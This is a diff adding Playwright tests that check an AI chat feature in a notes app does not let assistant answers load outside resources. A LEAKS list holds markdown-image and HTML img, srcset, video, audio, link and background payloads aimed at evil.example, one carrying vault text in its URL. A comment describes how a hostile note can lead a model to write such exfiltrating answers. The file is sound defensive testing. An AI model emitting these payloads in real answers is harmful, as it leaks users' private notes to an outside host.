@@ -1,4 +1,4 @@
-import { test, expect, navigateTo, enableChat } from './fixtures'
+import { test, expect, navigateTo, enableChat, openVaultFile, readVaultFile } from './fixtures'
 import type { Page } from '@playwright/test'
 
 /**
@@ -135,5 +135,113 @@ test.describe('31 — Sanitised HTML', () => {
     const vaultLink = prose.locator('a.chat-vault-source', { hasText: 'the plan' })
     await expect(vaultLink).toHaveAttribute('data-ink-path', 'Notes/plan.md')
     await expect(vaultLink).not.toHaveAttribute('target', /.*/)
+  })
+
+  /**
+   * A model that has read a hostile note can write an answer that makes the
+   * browser fetch a URL with vault text in it. The CSP allows https images, so
+   * nothing may be left in an answer that loads one.
+   */
+  const LEAKS = [
+    '![secret](https://evil.example/md?q=vault-secret)',
+    '<img src="https://evil.example/img?q=1">',
+    '<img srcset="https://evil.example/srcset 2x">',
+    '<picture><source srcset="https://evil.example/pic"><img src="https://evil.example/pic2"></picture>',
+    '<video poster="https://evil.example/poster" src="https://evil.example/video"></video>',
+    '<audio src="https://evil.example/audio"></audio>',
+    '<input type="image" src="https://evil.example/input">',
+    '<table><tr><td background="https://evil.example/bg">cell</td></tr></table>',
+    '<link rel="stylesheet" href="https://evil.example/css">',
+  ]
+  const LEAK_ANSWER = `leak-check **bold**\n\n${LEAKS.join('\n\n')}`
+
+  async function watchEvil(page: Page) {
+    const hits: string[] = []
+    await page.route(/evil\.example/, (route) => {
+      hits.push(route.request().url())
+      return route.abort()
+    })
+    return hits
+  }
+
+  async function loaders(page: Page): Promise<string[]> {
+    return page.evaluate(() =>
+      [...document.querySelectorAll('.chat-assistant-prose *')]
+        .map((e) => e.tagName.toLowerCase())
+        .filter((t) => ['img', 'picture', 'source', 'video', 'audio', 'input', 'link'].includes(t)),
+    )
+  }
+
+  test('31.4 a vault chat answer loads nothing from outside', async ({ vaultPage: page }) => {
+    const hits = await watchEvil(page)
+    await seedVaultChat(page, '00000000-0000-4000-8000-000000000033', 'Leaky answer', LEAK_ANSWER)
+    await enableChat(page)
+    await navigateTo(page, 'chat')
+    await page.getByText('Leaky answer').first().click()
+    const answer = page.locator('.chat-assistant-prose', { hasText: 'leak-check' })
+    await expect(answer).toBeVisible({ timeout: 10_000 })
+    await page.waitForTimeout(1500)
+
+    expect(hits).toEqual([])
+    expect(await loaders(page)).toEqual([])
+    // What can be kept is: the image is a link to click, and the text stays.
+    const link = answer.locator('a', { hasText: 'secret' })
+    await expect(link).toHaveAttribute('href', 'https://evil.example/md?q=vault-secret')
+    await expect(link).toHaveAttribute('target', '_blank')
+    await expect(answer.locator('strong')).toHaveText('bold')
+    await expect(answer).toContainText('cell')
+  })
+
+  test('31.5 a document chat answer loads nothing from outside', async ({ vaultPage: page }) => {
+    const hits = await watchEvil(page)
+    await enableChat(page)
+    await openVaultFile(page, 'Welcome.md')
+    let id = ''
+    await expect
+      .poll(
+        async () => {
+          id =
+            (await readVaultFile(page, 'Welcome.md')).match(
+              /chatAssetId:\s*([0-9a-f-]{36})/,
+            )?.[1] ?? ''
+          return id
+        },
+        { timeout: 15_000 },
+      )
+      .not.toBe('')
+
+    const now = new Date().toISOString()
+    const tid = '00000000-0000-4000-8000-000000000034'
+    await writeVaultFile(
+      page,
+      `_mentis/_chats/${id}/${tid}.json`,
+      JSON.stringify({
+        schemaVersion: 1,
+        id: tid,
+        documentAssetId: id,
+        documentPath: 'Welcome.md',
+        title: 'Leaky doc answer',
+        createdAt: now,
+        modifiedAt: now,
+        messages: [
+          { id: 'u1', role: 'user', content: 'Summarise', createdAt: now },
+          { id: 'a1', role: 'assistant', content: LEAK_ANSWER, createdAt: now },
+        ],
+      }),
+    )
+    await page.reload()
+    await page.waitForSelector('[data-testid="main-sidebar"]:visible, nav:visible', {
+      timeout: 30_000,
+    })
+    await openVaultFile(page, 'Welcome.md')
+    const open = page.locator('button[aria-label="Expand chat"], button[aria-label="Open chat"]')
+    await open.first().click()
+    const answer = page.locator('.chat-assistant-prose', { hasText: 'leak-check' })
+    await expect(answer).toBeVisible({ timeout: 15_000 })
+    await page.waitForTimeout(1500)
+
+    expect(hits).toEqual([])
+    expect(await loaders(page)).toEqual([])
+    await expect(answer.locator('a', { hasText: 'secret' })).toHaveAttribute('target', '_blank')
   })
 })
